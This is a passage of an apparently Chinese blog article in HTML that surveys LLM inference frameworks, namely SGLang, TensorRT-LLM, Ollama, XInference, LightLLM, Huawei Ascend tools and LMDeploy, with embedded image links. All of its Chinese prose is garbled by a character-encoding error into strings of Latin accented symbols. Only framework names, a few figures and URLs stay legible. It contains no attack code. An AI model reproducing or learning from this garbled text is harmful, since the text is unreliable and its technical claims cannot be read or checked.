<p>RadixAttentionâ€Œï¼šé€šè¿‡åŸºæ•°æ ‘ï¼ˆRadix Treeï¼‰å¯¹KVç¼“å­˜çš„å…¬å…±å‰ç¼€è¿›è¡Œé«˜æ•ˆå¤ç”¨ï¼Œç»“åˆLRUé©±é€ç­–ç•¥ä¸å¼•ç”¨è®¡æ•°æœºåˆ¶ï¼Œæ˜¾è‘—æå‡ç¼“å­˜åˆ©ç”¨ç‡ã€‚ä¸åŒäºä¼ ç»Ÿæ¡†æ¶åœ¨æ¨ç†ç»“æŸåå³ä¸¢å¼ƒç¼“å­˜ï¼ŒSGLangæŒä¹…åŒ–ä¿ç•™æç¤ºä¸ç”Ÿæˆå†…å®¹çš„KVçŠ¶æ€äºåŸºæ•°æ ‘ç»“æ„ä¸­ï¼Œä»è€Œæ”¯æŒå¿«é€Ÿçš„å‰ç¼€åŒ¹é…ã€ç¼“å­˜å¤ç”¨ã€åŠ¨æ€æ’å…¥ä¸æ™ºèƒ½é©±é€ã€‚è¯¥è®¾è®¡æå¤§å¢å¼ºäº†ç³»ç»Ÿåœ¨å¤šè½®äº¤äº’ä¸åºåˆ—è§„åˆ’åœºæ™¯ä¸‹çš„æ€§èƒ½ï¼Œå®æµ‹è¡¨æ˜ï¼Œåœ¨Llama-7Bæ¨¡å‹ä¸Šæ‰§è¡Œå¤šè½®å¯¹è¯ä»»åŠ¡æ—¶ï¼Œå…¶ååé‡è¾ƒvLLMæå‡è¾¾5å€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed1a0f1ad3f14b19a2dd83705acb6a8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=kbWpjP1m3nEUKTKxesc6IIW4rD0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>RadixAttention æ“ä½œç¤ºä¾‹ï¼Œé‡‡ç”¨ LRU é©±é€ç­–ç•¥ï¼Œå±•ç¤ºäº†ä¹ä¸ªæ­¥éª¤</p>
<p>ç»“æ„åŒ–è¾“å‡ºâ€Œï¼šå€ŸåŠ©æ­£åˆ™è¡¨è¾¾å¼å®æ–½çº¦æŸè§£ç ï¼Œå¯ç›´æ¥ç”Ÿæˆç¬¦åˆè§„èŒƒçš„ç»“æ„åŒ–æ ¼å¼ï¼ˆå¦‚JSONã€XMLï¼‰ï¼Œæ˜¾è‘—æå‡APIè°ƒç”¨ä¸æ•°æ®å¤„ç†çš„æ•ˆç‡ã€‚è¯¥æœºåˆ¶ä»¤SGLangåœ¨å“åº”ç»“æ„åŒ–æŸ¥è¯¢æ—¶æ›´ä¸ºæ•æ·ï¼Œå¤§å¹…é™ä½åç»­è§£æè´Ÿæ‹…ã€‚</p>
<p>è½»é‡æ¨¡å—åŒ–æ¶æ„â€Œï¼šè°ƒåº¦å™¨åŸºäºçº¯Pythonæ„å»ºï¼Œä»£ç ç²¾ç®€å´å…·å¤‡ä¼˜å¼‚çš„å¯æ‰©å±•æ€§ã€‚å…¶è®¾è®¡æ”¯æŒè·¨GPUçš„ç¼“å­˜å…±äº«ï¼Œæœ‰æ•ˆç¼“è§£å¤šå¡å¹¶è¡Œè®¡ç®—ä¸­çš„èµ„æºå†—ä½™é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f1bc818d48c4cca9ad1c4a1d4d5bbc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=Caj1GGY2tnre3ImMa3YlJh9AVMs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-5">é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿å±€é™</h3>
<p>é€‚ç”¨åœºæ™¯â€Œï¼šSGLang åœ¨é«˜å¹¶å‘ã€ä½å»¶è¿Ÿçš„ç³»ç»Ÿä¸­è¡¨ç°å“è¶Šï¼Œå°¤å…¶é€‚ç”¨äºâ€Œå¤§è§„æ¨¡å¹¶è¡Œè¯·æ±‚å¤„ç†â€Œçš„ç¯å¢ƒï¼Œä¾‹å¦‚â€ŒAIé©±åŠ¨çš„å®¢æœä¸­å°â€Œã€â€Œåœ¨çº¿å¹¿å‘ŠæŠ•æ”¾å¼•æ“â€Œå’Œâ€Œç‰©è”ç½‘è®¾å¤‡å®æ—¶å“åº”ç½‘å…³â€Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd6e02f832d54311abab0cfe5fa5feaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=ZsgmvZFAlm9ouDf%2BITSWtNKOMBA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-6">ä¸‰ã€TensorRT-LLMï¼šNVIDIAçš„æ·±åº¦ä¼˜åŒ–æ¨ç†å¼•æ“</h2>
<p>TensorRT-LLM æ˜¯ NVIDIA åŸºäº TensorRT æ„å»ºçš„é«˜æ€§èƒ½æ¨ç†å¼•æ“ï¼Œä¸“ä¸ºå¤§è¯­è¨€æ¨¡å‹ä¼˜åŒ–ï¼Œè‡´åŠ›äºå…¨é¢é‡Šæ”¾ NVIDIA GPU çš„ç®—åŠ›ä¼˜åŠ¿ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e6d76da44548efa005336944bbfe6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=fXj%2Fm0ErEyrrRODYkuWpnoZK8ww%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-7">1ã€æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹</h3>
<p>TensorRT-LLMçš„æ ¸å¿ƒæŠ€æœ¯åŒ…æ‹¬ï¼š</p>
<p>é¢„ç¼–è¯‘ä¼˜åŒ–â€Œï¼šå€ŸåŠ©TensorRTçš„ç«¯åˆ°ç«¯ä¼˜åŒ–æ¡†æ¶ï¼Œå¯¹æ¨¡å‹æ‰§è¡Œç¦»çº¿ç¼–è¯‘ï¼Œç”Ÿæˆé«˜åº¦ç²¾ç‚¼çš„TensorRTå¼•æ“æ–‡ä»¶ã€‚å°½ç®¡è¯¥è¿‡ç¨‹å¼•å…¥ä¸€å®šçš„å†·å¯åŠ¨å¼€é”€ï¼Œå´èƒ½å¤§å¹…å¢å¼ºæ¨ç†æ•ˆç‡ä¸ç³»ç»Ÿååèƒ½åŠ›ã€‚</p>
<p>é‡åŒ–æ”¯æŒâ€Œï¼šå…¼å®¹FP8ã€FP4ä¸INT4ç­‰å¤šç§ä½ç²¾åº¦é‡åŒ–ç­–ç•¥ï¼Œé€šè¿‡ç²¾åº¦å‹ç¼©æœ‰æ•ˆé™ä½æ˜¾å­˜æ¶ˆè€—å¹¶åŠ é€Ÿæ¨ç†æµç¨‹ã€‚åœ¨FP8æ¨¡å¼ä¸‹ï¼ŒTensorRT-LLMå¯ç»´æŒè¿‘ä¼¼åŸç”Ÿç²¾åº¦çš„è¾“å‡ºè´¨é‡ï¼ŒåŒæ—¶æ˜¾å­˜éœ€æ±‚ä¸‹é™è¶…40%ã€‚</p>
<p>å†…æ ¸çº§ä¼˜åŒ–â€Œï¼šå¯¹Transformerç»“æ„ä¸­çš„æ ¸å¿ƒç»„ä»¶ï¼ˆå¦‚è‡ªæ³¨æ„åŠ›æœºåˆ¶ã€å‰é¦ˆç¥ç»ç½‘ç»œç­‰ï¼‰å®æ–½åº•å±‚CUDAå†…æ ¸é‡æ„ï¼Œå®ç°è®¡ç®—å¯†é›†å‹æ“ä½œçš„æè‡´å¹¶è¡Œä¸å†…å­˜è®¿é—®ä¼˜åŒ–ï¼Œä»è€Œåœ¨NVIDIA GPUå¹³å°è¾¾æˆå“è¶Šæ€§èƒ½è¡¨ç°ã€‚</p>
<p>å¼ é‡å¹¶è¡Œä¸æµæ°´çº¿å¹¶è¡Œâ€Œï¼šæ”¯æŒè·¨å¤šGPUèŠ‚ç‚¹çš„åˆ†å¸ƒå¼æ¨ç†ï¼Œèåˆå¼ é‡å¹¶è¡Œä¸æµæ°´çº¿å¹¶è¡Œç­–ç•¥ï¼Œçµæ´»æ‰©å±•æ¨¡å‹å‚æ•°è§„æ¨¡ï¼Œæ˜¾è‘—æå‡å•ä½æ—¶é—´å†…çš„è¯·æ±‚å¤„ç†å®¹é‡ã€‚</p>
<h3 data-id="heading-8">2ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿å±€é™</h3>
<p>é€‚ç”¨åœºæ™¯ï¼šTensorRT-LLMç‰¹åˆ«é€‚åˆå¯¹å»¶è¿Ÿè¦æ±‚æé«˜çš„ä¼ä¸šçº§åº”ç”¨ï¼Œå¦‚å®æ—¶å®¢æœç³»ç»Ÿã€é‡‘èé«˜é¢‘äº¤æ˜“å’Œéœ€è¦å¿«é€Ÿå“åº”çš„APIæœåŠ¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d59ad32091f41ffa1931b748a40257d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=FvK41B6gBYVhePIiQ7ELR4ugcCo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-9">å››ã€Ollamaï¼šè½»é‡çº§çš„æœ¬åœ°æ¨ç†å¹³å°</h2>
<p>Ollamaæ˜¯ç”±AIç¤¾åŒºå¼€å‘çš„è½»é‡çº§æœ¬åœ°æ¨ç†å¹³å°ï¼Œä¸“æ³¨äºç®€åŒ–å¤§æ¨¡å‹æœ¬åœ°éƒ¨ç½²å’Œè¿è¡Œï¼Œç‰¹åˆ«é€‚åˆä¸ªäººå¼€å‘è€…å’Œç ”ç©¶è€…ã€‚</p>
<h3 data-id="heading-10">1ã€æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹</h3>
<p>Ollamaçš„æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹åŒ…æ‹¬ï¼š</p>
<p>åŸºäºGoè¯­è¨€çš„å°è£…â€Œï¼šOllamaé‡‡ç”¨Goè¯­è¨€æ„å»ºï¼Œé€šè¿‡æ¨¡å—åŒ–æ¶æ„å°†æ¨¡å‹æƒé‡ã€è¿è¡Œä¾èµ–ä¸ç¯å¢ƒé…ç½®ç»Ÿä¸€æ‰“åŒ…ä¸ºå®¹å™¨åŒ–å•å…ƒï¼Œç”¨æˆ·æ— éœ€é…ç½®åº•å±‚ç»„ä»¶ï¼Œä»…éœ€æ‰§è¡Œå•æ¡å‘½ä»¤å³å¯å¯åŠ¨æ¨¡å‹æœåŠ¡ã€‚</p>
<p>llama.cppé›†æˆâ€Œï¼šOllamaå†…åµŒllama.cppâ€”â€”è¿™ä¸€é«˜æ•ˆçš„å¤§è¯­è¨€æ¨¡å‹æ¨ç†å¼•æ“ï¼Œå…¼å®¹1.5ä½ã€2ä½ã€3ä½ã€4ä½ã€5ä½ã€6ä½ä¸8ä½æ•´æ•°é‡åŒ–æ–¹æ¡ˆï¼Œå®ç°è½»é‡çº§æ¨ç†æ€§èƒ½ä¼˜åŒ–ã€‚</p>
<p>è·¨å¹³å°æ”¯æŒâ€Œï¼šåŸç”Ÿé€‚é…macOSã€Windowsä¸Linuxä¸‰å¤§æ“ä½œç³»ç»Ÿï¼Œå¯¹ARMæ¶æ„è®¾å¤‡é«˜åº¦ä¼˜åŒ–ï¼Œå°¤å…¶åœ¨è‹¹æœMç³»åˆ—èŠ¯ç‰‡ä¸Šè¡¨ç°ä¼˜å¼‚ã€‚</p>
<p>æœ¬åœ°åŒ–éƒ¨ç½²â€Œï¼šæ”¯æŒæ— ç½‘ç»œä¾èµ–çš„å®Œå…¨ç¦»çº¿è¿è¡Œï¼Œå…¨é¢ä¿éšœæ•°æ®ä¸å¤–æ³„ã€éšç§ä¸æ³„éœ²ï¼Œé€‚ç”¨äºå¯¹å®‰å…¨æ€§è¦æ±‚ä¸¥è‹›çš„ç§æœ‰åŒ–åœºæ™¯ã€‚</p>
<p>ä½ç¡¬ä»¶é—¨æ§›â€Œï¼šä¸ä¾èµ–é«˜æ€§èƒ½GPUï¼Œå¯åœ¨æ¶ˆè´¹çº§ç¬”è®°æœ¬ã€åµŒå…¥å¼ç»ˆç«¯åŠè¾¹ç¼˜è®¡ç®—èŠ‚ç‚¹ä¸Šæµç•…è¿è¡Œï¼Œæ˜¾è‘—é™ä½å¤§æ¨¡å‹è½åœ°çš„ç¡¬ä»¶æˆæœ¬ã€‚</p>
<h3 data-id="heading-11">2ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿å±€é™</h3>
<p>é€‚ç”¨åœºæ™¯ï¼šOllamaç‰¹åˆ«é€‚åˆä¸ªäººå¼€å‘è€…ã€æ•™è‚²å±•ç¤ºå’Œæœ¬åœ°éšç§è¦æ±‚é«˜çš„åœºæ™¯ï¼Œå¦‚ä¸ªäººçŸ¥è¯†åº“ã€æ•™è‚²æ¼”ç¤ºå’ŒåŸå‹éªŒè¯ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65e4d22e147440a1b5ee039da9446f1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=5xRpMdZflF14UndbOK0MiplccyQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-12">äº”ã€XInferenceï¼šåˆ†ç¦»å¼éƒ¨ç½²çš„åˆ†å¸ƒå¼æ¨ç†æ¡†æ¶</h2>
<p>XInferenceæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„åˆ†å¸ƒå¼æ¨ç†æ¡†æ¶ï¼Œä¸“æ³¨äºç®€åŒ–AIæ¨¡å‹çš„è¿è¡Œå’Œé›†æˆï¼Œç‰¹åˆ«é€‚åˆä¼ä¸šçº§å¤§è§„æ¨¡éƒ¨ç½²ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/577fbf5bce0b4fd78b192693ea7199bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=wS6s81W3VgI8TGdpeKHSBKxLg3U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-13">1ã€æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹</h3>
<p>XInferenceçš„æ ¸å¿ƒæ¶æ„ï¼š</p>
<p>APIå±‚â€Œï¼šé‡‡ç”¨FastAPIæ­å»ºï¼Œå…¼å®¹RESTfulè§„èŒƒä¸OpenAIæ¥å£æ ‡å‡†ï¼Œæ— ç¼å¯¹æ¥ç°æœ‰ç³»ç»Ÿç”Ÿæ€ã€‚</p>
<p>Core Serviceå±‚â€Œï¼šä¾æ‰˜è‡ªç ”Xoscaræ¡†æ¶ï¼Œé«˜æ•ˆæŠ½è±¡åˆ†å¸ƒå¼è°ƒåº¦ä¸é€šä¿¡é€»è¾‘ï¼ŒåŸç”Ÿæ”¯æŒå¤šGPUå¹¶è¡ŒåŠKubernetesé›†ç¾¤å¼¹æ€§ä¼¸ç¼©ã€‚</p>
<p>Actorå±‚â€Œï¼šç”±ModelActorå®ä¾‹æ„æˆï¼Œæ‰¿æ‹…æ¨¡å‹åŠ è½½ä¸æ¨ç†æ‰§è¡ŒèŒè´£ï¼Œå„å®ä¾‹éƒ¨ç½²äºActorPoolå†…ï¼Œå®ç°ç‹¬ç«‹è°ƒåº¦ä¸è‡ªæ²»ç®¡ç†ã€‚</p>
<p>åˆ†ç¦»å¼éƒ¨ç½²â€Œï¼šå°†Prefillä¸Decodeé˜¶æ®µåˆ†åˆ«æ˜ å°„è‡³ä¸åŒGPUï¼Œå€ŸåŠ©DeepEPé€šä¿¡åº“å®ç°KVCacheä½å»¶è¿Ÿä¼ è¾“ï¼Œæ˜¾è‘—å¢å¼ºç¡¬ä»¶èµ„æºååŒæ•ˆç‡ã€‚</p>
<p>ç®—å­ä¼˜åŒ–â€Œï¼šåœ¨Actorå±‚é›†æˆFlashMLAä¸DeepGEMMç®—å­ï¼Œå…¨é¢é€‚é…æµ·å…‰DCUä¸NVIDIA Hopper GPUæ¶æ„ï¼Œæœ€å¤§åŒ–ç®—åŠ›ååèƒ½åŠ›ã€‚</p>
<p>è¿ç»­æ‰¹å¤„ç†â€Œï¼šèåˆvLLMè¿ç»­æ‰¹å¤„ç†æœºåˆ¶ï¼ŒåŠ¨æ€èšåˆè¯·æ±‚æµï¼Œä¼˜åŒ–è°ƒåº¦ç­–ç•¥ï¼ŒæŒç»­æå‡GPUä½¿ç”¨ç‡ä¸ååæ€§èƒ½ã€‚</p>
<h3 data-id="heading-14">2ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿å±€é™</h3>
<p>é€‚ç”¨åœºæ™¯ï¼šXInferenceç‰¹åˆ«é€‚åˆä¼ä¸šçº§å¤§è§„æ¨¡éƒ¨ç½²ï¼Œå¦‚æ™ºèƒ½å®¢æœç³»ç»Ÿã€çŸ¥è¯†åº“é—®ç­”å’Œéœ€è¦åˆ†å¸ƒå¼æ‰©å±•çš„åœºæ™¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acb3d730c0d54ab38ca92a8f2513510a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=FD1PgPJjamPL3UPPwV%2BVCuge1V4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-15">å…­ã€LightLLMï¼šè½»é‡çº§é«˜æ€§èƒ½æ¨ç†æ¡†æ¶</h2>
<p>LightLLMæ˜¯ä¸€ä¸ªåŸºäºPythonçš„LLMæ¨ç†å’ŒæœåŠ¡æ¡†æ¶ï¼Œä»¥è½»é‡çº§è®¾è®¡ã€æ˜“äºæ‰©å±•å’Œé«˜é€Ÿæ€§èƒ½è€Œé—»åã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92fb78eb6e854e6e97526b978027cb5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=k6Oq9%2BblekNgJUbsrbVIY%2BR6018%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-16">1ã€æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹</h3>
<p>LightLLMçš„æ ¸å¿ƒæŠ€æœ¯åŒ…æ‹¬ï¼š</p>
<p>ä¸‰è¿›ç¨‹å¼‚æ­¥åä½œâ€Œï¼šç”±ç‹¬ç«‹è¿›ç¨‹åˆ†åˆ«æ‰¿æ‹… tokenizationã€æ¨¡å‹æ¨ç†ä¸ detokenization ä»»åŠ¡ï¼Œè¾¾æˆå¼‚æ­¥è¿è¡Œï¼Œæœ‰æ•ˆç¼“è§£ I/O ç“¶é¢ˆã€‚</p>
<p>åŠ¨æ€æ‰¹å¤„ç†â€Œï¼šä¾æ®è¯·æ±‚ç‰¹å¾ä¸ç³»ç»Ÿè´Ÿè½½å®æ—¶ä¼˜åŒ–æ‰¹å¤„ç†ç­–ç•¥ï¼Œåœ¨ååé‡ä¸å»¶è¿Ÿä¹‹é—´å®ç°ç²¾å‡†å¹³è¡¡ã€‚</p>
<p>TokenAttention æœºåˆ¶â€Œï¼šé‡‡ç”¨ä»¥ token ä¸ºç²’åº¦çš„ KV ç¼“å­˜ç®¡ç†æ–¹æ¡ˆï¼Œå½»åº•æ¶ˆé™¤å†…å­˜å†—ä½™ï¼Œå…¼å®¹ int8 KV Cacheï¼Œä½¿æœ€å¤§ token ååèƒ½åŠ›æå‡è¿‘ 2 å€ã€‚</p>
<p>é›¶å¡«å…… (nopad-Attention)â€Œï¼šç²¾å‡†é€‚é…è¾“å…¥åºåˆ—é•¿åº¦çš„æ˜¾è‘—å·®å¼‚ï¼Œè§„é¿ä¼ ç»Ÿå¡«å……ç­–ç•¥å¯¼è‡´çš„è®¡ç®—èµ„æºå†—ä½™ã€‚</p>
<p>FlashAttention é›†æˆâ€Œï¼šå¤§å¹…åŠ é€Ÿæ³¨æ„åŠ›è¿ç®—æ•ˆç‡ï¼ŒåŒæ­¥å‰Šå‡ GPU æ˜¾å­˜æ¶ˆè€—ã€‚</p>
<p>å¼ é‡å¹¶è¡ŒæŠ€æœ¯â€Œï¼šååŒå¤š GPU å®ç°å¼ é‡çº§å¹¶è¡Œè®¡ç®—ï¼Œæ˜¾è‘—åŠ å¿«è¶…å¤§è§„æ¨¡æ¨¡å‹çš„æ¨ç†å“åº”é€Ÿåº¦ã€‚</p>
<h3 data-id="heading-17">2ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿å±€é™</h3>
<p>é€‚ç”¨åœºæ™¯ï¼šLightLLMç‰¹åˆ«é€‚åˆéœ€è¦é«˜ååé‡çš„åœºæ™¯ï¼Œå¦‚å¤§è§„æ¨¡è¯­è¨€æ¨¡å‹APIæœåŠ¡ã€å¤šæ¨¡æ€æ¨¡å‹åœ¨çº¿æ¨ç†å’Œé«˜å¹¶å‘èŠå¤©æœºå™¨äººåç«¯ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1111a91156c34e8399197bc64bed23b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=74dtweg%2BEcBzOfsL14DK3CkwCoQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-18">ä¸ƒã€å›½äº§ç¡¬ä»¶é€‚é…æ¡†æ¶ï¼šæ˜‡è…¾ä¸LMDeploy</h2>
<p>éšç€å›½äº§AIèŠ¯ç‰‡çš„å‘å±•ï¼Œé’ˆå¯¹æ˜‡è…¾ç­‰å›½äº§ç¡¬ä»¶çš„æ¨ç†æ¡†æ¶ä¹Ÿæ—¥ç›Šæˆç†Ÿã€‚æ˜‡è…¾AIå¤„ç†å™¨å’ŒLMDeployæ˜¯å›½äº§ç¡¬ä»¶é€‚é…çš„ä»£è¡¨ã€‚</p>
<h3 data-id="heading-19">1ã€æ˜‡è…¾AIå¤„ç†å™¨æ¡†æ¶</h3>
<p>æ˜‡è…¾AIå¤„ç†å™¨æ˜¯åä¸ºä¾æ‰˜è‡ªç ”è¾¾èŠ¬å¥‡æ¶æ„æ‰“é€ çš„ä¸“ç”¨AIåŠ é€ŸèŠ¯ç‰‡ï¼Œå…¶æ¨ç†ä½“ç³»æ ¸å¿ƒåŒ…å«ä»¥ä¸‹ä¸‰å¤§ç»„ä»¶ï¼š</p>
<p>MindSpore Inference[12]â€Œï¼šåä¸ºè‡ªç ”çš„æ¨ç†å¼•æ“ï¼Œæ·±åº¦é€‚é…æ˜‡è…¾è¾¾èŠ¬å¥‡æ¶æ„ï¼Œå®ç°æ•´å›¾ä¸‹æ²‰è‡³èŠ¯ç‰‡çš„On-Deviceæ‰§è¡Œï¼Œèåˆå…³é”®ç®—å­ï¼ˆå¦‚çŸ©é˜µä¹˜æ³•ä¸æ¿€æ´»å‡½æ•°ï¼‰ï¼Œå¹¶ä¾æ‰˜é™æ€å›¾ä¼˜åŒ–ç­–ç•¥ï¼Œæ˜¾è‘—å¢å¼ºæ¨ç†æ•ˆç‡ã€‚</p>
<p>CBQé‡åŒ–æŠ€æœ¯â€Œï¼šç”±åä¸ºè¯ºäºšæ–¹èˆŸå®éªŒå®¤ä¸ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ååŒç ”å‘çš„è·¨å—é‡å»ºåè®­ç»ƒé‡åŒ–æ–¹æ¡ˆï¼Œä»…éœ€0.1%çš„åŸå§‹è®­ç»ƒæ•°æ®ï¼Œå³å¯ä¸€é”®å°†å¤§æ¨¡å‹å‹ç¼©è‡³åŸä½“ç§¯çš„1/7ï¼ŒåŒæ—¶ä¿æŒæµ®ç‚¹ç²¾åº¦è¾¾99%ï¼ŒçœŸæ­£è¾¾æˆâ€œè½»é‡ä¸é™æ™ºâ€çš„ç›®æ ‡ã€‚</p>
<p>æ˜‡è…¾CANNè½¯ä»¶æ ˆâ€Œï¼šæ„å»ºå¤šå±‚æ¬¡å¼€å‘æ¥å£ä½“ç³»ï¼Œé€šè¿‡AscendCLä¸TBEä¸¤å¤§ç¼–ç¨‹æ¥å£ï¼Œèµ‹èƒ½å„ç±»AIåº”ç”¨åœ¨CANNå¹³å°ä¸Šçš„é«˜æ•ˆéƒ¨ç½²ä¸æé€Ÿè¿è¡Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d016f2e8914849c48fed4f0f87e3f748~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=ptIIOrNup9bt6g2gTdTPssKfvp8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-20">2ã€LMDeployï¼šè§†è§‰è¯­è¨€æ··åˆä»»åŠ¡ä¸“å®¶</h3>
<p>LMDeployæ˜¯ç”±ä¸Šæµ·äººå·¥æ™ºèƒ½å®éªŒå®¤æ¨¡å‹å‹ç¼©å’Œéƒ¨ç½²å›¢é˜Ÿå¼€å‘çš„éƒ¨ç½²å·¥å…·ç®±ï¼Œä¸“æ³¨äºå¤§è¯­è¨€æ¨¡å‹å’Œè§†è§‰è¯­è¨€æ¨¡å‹çš„éƒ¨ç½²ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ace6cfd47b0340cf8f8ad2ee6855c6c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=0o0SY0RQFrDR16vECXTOtvBcCrU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ ¸å¿ƒæŠ€æœ¯ï¼š</p>
<p>å›½äº§GPUæ·±åº¦é€‚é…â€Œï¼Œæ·±åº¦ä¼˜åŒ–æ˜‡è…¾ç­‰å›½äº§ç¡¬ä»¶æ¶æ„</p>
<p>æ˜¾å­˜ä¼˜åŒ–â€Œï¼Œé‡‡ç”¨åŠ¨æ€é‡åŒ–ä¸æ¨¡å‹åˆ‡åˆ†æŠ€æœ¯ï¼Œæ˜¾è‘—å‹ç¼©æ˜¾å­˜å ç”¨</p>
<p>å¤šæ¨¡æ€èåˆæ”¯æŒâ€Œï¼ŒååŒå¤„ç†è§†è§‰ä¸è¯­è¨€è·¨æ¨¡æ€æ•°æ®æµ</p>
<p>TurboMindå¼•æ“â€Œï¼Œå®ç°é«˜æ•ˆ4bitæ¨ç†çš„CUDA kernelåŠ é€Ÿ</p>
<p>3ã€é€‚ç”¨åœºæ™¯ï¼š</p>
<p>å›½å†…ä¼ä¸šã€æ”¿åºœæœºæ„éƒ¨ç½²ï¼Œè§†è§‰è¯­è¨€æ··åˆä»»åŠ¡ã€‚</p>
<h2 data-id="heading-21">å…«ã€æ¡†æ¶é€‰å‹å¯¹æ¯”ä¸é€‚ç”¨åœºæ™¯åˆ†æ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e39adaedaf749a6b926592bc6ca0e3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=1woyhO3Qmfk%2BgtdMSzX2wslkGqw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ€å</p>
